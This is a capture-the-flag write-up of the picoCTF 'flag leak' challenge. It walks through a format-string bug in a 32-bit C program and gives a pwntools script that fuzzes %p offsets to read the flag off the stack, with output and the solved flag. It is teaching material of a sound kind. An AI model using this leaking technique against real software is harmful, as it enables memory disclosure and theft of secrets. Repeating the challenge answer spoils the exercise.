### Binary Exploitation

### Source: PICOCTF

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7cdf03860c5c78d6e375e91d88a2b05b28389fd0, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ checksec vuln
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/Pico/flakleak/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We're working with x86 binary. Which has only NX enabled as a protection

Source code is given

```
 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```


Reading it doesn't show any form of buffer overflow 

But there's a vulnerability which is this 

```
   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
 ```
 
We see that it stores the user input in the story buffer then prints it out without using a format specifier

This means that we're working with a binary with format string vulnerability

Cool! WIth this we can leak stuff off the stack of the binary

Reading the code shows that the flag is stored on the stack but it isn't called in the main function but we can possibly leak it

So basically to leak stuff off the stack can be done using various format specifier like %p, %d, %x 

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ ./vuln 
Tell me a story and then I'll tell you one >> AAAA%p%p%p%p%p%p%p%p%p%p
Here's a story - 
AAAA0xff8cf560(nil)0x80493460x414141410x702570250x702570250x702570250x702570250x702570250xf7f43400
```

Then the address we get we can then try to convert to string and we notice that our input is leaked also i.e AAAA is 0x414141 in hex

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ echo 0x41414141 | xxd -r 
AAAA
```

That means our input has an offset of 4 in the stack. So instead of doing AAAA%p%p%p we can just specify the offset to leak

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ ./vuln
Tell me a story and then I'll tell you one >> AAAA%4$p
Here's a story - 
AAAA0x41414141
```

And we can keep on going to see if there's any string in the stack leaked. Doing this manually will take a lot of time so instead i'll use a script to fuzz for the first 100 address on the stack 

```
from pwn import *

context.log_level = 'info'

string = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Connect to server
        #io = remote('localhost', 1337, level='warn')
        io = process('./vuln')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b"Here's a story -")
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up list of string leaked
                string += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(string)
```

While it fuzz address using `%i$p` where i is the range its fuzzing

It will then convert those address to string and decode its endianess then save it in a string variable

So after it runs finish it prints out the list of strings found

Lets run it 

```
──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ python3 exploit.py 
[+] Starting local process './vuln': pid 42901
[*] Process './vuln' stopped with exit code 0 (pid 42901)
0:  
%0$p

[+] Starting local process './vuln': pid 42903
1:  

[*] Stopped process './vuln' (pid 42903)
[+] Starting local process './vuln': pid 42905
2:  

[*] Stopped process './vuln' (pid 42905)
[+] Starting local process './vuln': pid 42907
[*] Process './vuln' stopped with exit code 0 (pid 42907)
3:  
0x8049346

F\x93\x04
[+] Starting local process './vuln': pid 42909
4:  
0x70243425

%4$p
[*] Process './vuln' stopped with exit code 0 (pid 42909)
[+] Starting local process './vuln': pid 42911
5:  

[*] Stopped process './vuln' (pid 42911)
[+] Starting local process './vuln': pid 42913
6:  

[*] Stopped process './vuln' (pid 42913)
[+] Starting local process './vuln': pid 42915
7:  

[------------------SNIP--------------------]

�2��
[+] Starting local process './vuln': pid 43115
[*] Process './vuln' stopped with exit code 0 (pid 43115)
99:  
0x804c000

\x00\x04
[*] %4$pflag{fake_for_testing}
```

We successfully leaked the flag from the stack

So i made one to run on the remote server

Here's my exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/flagleak/exploit.py)

Running it works

```
└─$ python2 exploit.py
[+] Opening connection to saturn.picoctf.net on port 50529: Done
36:  
0x6f636970

pico
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
37:  
0x7b465443

CTF{
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
38:  
0x6b34334c

L34k
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
39:  
0x5f676e31

1ng_
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
40:  
0x67346c46

Fl4g
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
41:  
0x6666305f

_0ff
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
42:  
0x3474535f

_St4
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
43:  
0x635f6b63

ck_c
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
44:  
0x34396532

2e94
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
45:  
0x7d643365

e3d}
[*] Closed connection to saturn.picoctf.net port 50529
[*] picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}
```

And we're done 

<br> <br>
[Back To Home](../index.md)
                                                 
